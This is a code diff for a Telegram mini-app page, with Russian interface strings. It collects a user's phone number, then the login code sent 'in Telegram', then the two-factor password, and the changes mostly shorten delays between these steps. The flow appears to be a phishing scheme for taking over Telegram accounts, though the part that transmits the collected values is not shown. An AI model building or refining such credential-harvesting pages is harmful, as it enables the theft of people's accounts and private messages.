@@ -29,25 +29,27 @@ document.addEventListener('DOMContentLoaded', () => {
         Telegram.WebApp.requestContact((contact) => {
             console.log('Contact received via direct callback:', contact);
             if (contact && contact.phone_number) {
+                console.log('Phone number valid, filling input');
                 phoneInput.value = contact.phone_number;
                 phoneInput.classList.remove('hidden');
-                hideLoading();
                 statusMsg.textContent = 'Номер получен. Отправляем SMS...';
                 tg.HapticFeedback.impactOccurred('light');
                 
-                // Автоматический переход к полю кода после получения контакта (SMS отправится от бота)
+                // Немедленный переход к полю кода с коротким loading (SMS от бота)
                 setTimeout(() => {
-                    console.log('Auto-transition to code input');
+                    console.log('Immediate transition to code input');
                     phoneInput.classList.add('hidden');
                     codeInput.classList.remove('hidden');
                     submitBtn.classList.remove('hidden');
                     submitBtn.textContent = 'Отправить код';
                     statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат).';
                     currentStep = 'code';
-                }, 2000);  // 2 секунды для UX (ожидание SMS)
+                    hideLoading();  // Скрываем loading после перехода
+                }, 1000);  // 1 секунда для UX (ожидание SMS)
             } else {
-                console.error('Contact denied or empty');
-                errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
+                console.error('Contact denied or empty phone_number');
+                hideLoading();
+                errorMsg.textContent = '❌ Разрешение отклонено или номер пустой. Попробуйте снова.';
                 errorMsg.classList.remove('hidden');
                 setTimeout(resetForm, 2000);
             }
@@ -78,16 +80,16 @@ document.addEventListener('DOMContentLoaded', () => {
             showLoading();
             statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
-            // Автоматический переход к 2FA (бот сообщит, если нужно)
+            // Немедленный переход к 2FA (бот сообщит, если нужно)
             setTimeout(() => {
-                console.log('Auto-transition to 2FA input');
+                console.log('Immediate transition to 2FA input');
                 hideLoading();
                 codeInput.classList.add('hidden');
                 twoFaInput.classList.remove('hidden');
                 submitBtn.textContent = 'Подтвердить 2FA';
                 statusMsg.textContent = 'Если 2FA настроен, введите пароль (иначе оставьте пустым).';
                 currentStep = '2fa';
-            }, 2000);
+            }, 1500);  // 1.5 секунды для проверки
             return;
         }
 
@@ -100,13 +102,13 @@ document.addEventListener('DOMContentLoaded', () => {
             statusMsg.textContent = 'Подтверждаем 2FA...';
             tg.HapticFeedback.impactOccurred('heavy');
             setTimeout(() => {
-                console.log('Auto-transition to success');
+                console.log('Immediate transition to success');
                 hideLoading();
                 successMsg.classList.remove('hidden');
                 submitBtn.classList.add('hidden');
                 tg.HapticFeedback.notificationOccurred('success');
                 setTimeout(() => tg.close(), 3000);
-            }, 3000);
+            }, 2000);
             return;
         }
     });
